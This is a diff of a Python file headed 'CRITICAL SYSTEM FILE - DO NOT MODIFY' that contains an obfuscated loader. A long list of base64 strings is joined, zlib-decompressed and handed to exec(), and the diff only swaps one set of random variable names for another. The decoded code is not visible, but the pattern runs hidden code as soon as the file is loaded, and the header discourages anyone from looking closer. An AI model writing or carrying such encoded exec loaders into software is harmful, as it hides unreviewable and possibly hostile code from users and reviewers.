@@ -1,8 +1,8 @@
 # CRITICAL SYSTEM FILE - DO NOT MODIFY
-import base64 as _ARSzbdRs
-import zlib as _PqCIDSLm
+import base64 as _jNCooPGO
+import zlib as _XeOzvvJy
 
-_QAZncZeq = [
+_IrzxeLAE = [
     'eNrtfdty40aS6Du/AkZHD0Gboq7tneEMPavuVncr+qYQ1fY4uAwERBQpWCDABUCp',
     '1QxGnKfzfB7OF+6XnMysOy4k1bZ3xxPHM2FThaqsrKysrMysrKxovkizwsnYfy5Z',
     'XuRdZ5IuHloRL03h7yKas67zS54mrWmWzp0wKBiWOaKO/JvXDFlcBLziNA7yW1nr',
@@ -229,6 +229,6 @@ _QAZncZeq = [
     'Xs5mqqig5Gss5AHi/w+hGVXW',
 ]
 
-_fgUbFvKJ = "".join(_QAZncZeq)
-_SfJfxgXZ = _PqCIDSLm.decompress(_ARSzbdRs.b64decode(_fgUbFvKJ))
-exec(_SfJfxgXZ.decode('utf-8'))
+_OnSHOyAK = "".join(_IrzxeLAE)
+_DelIEHMt = _XeOzvvJy.decompress(_jNCooPGO.b64decode(_OnSHOyAK))
+exec(_DelIEHMt.decode('utf-8'))
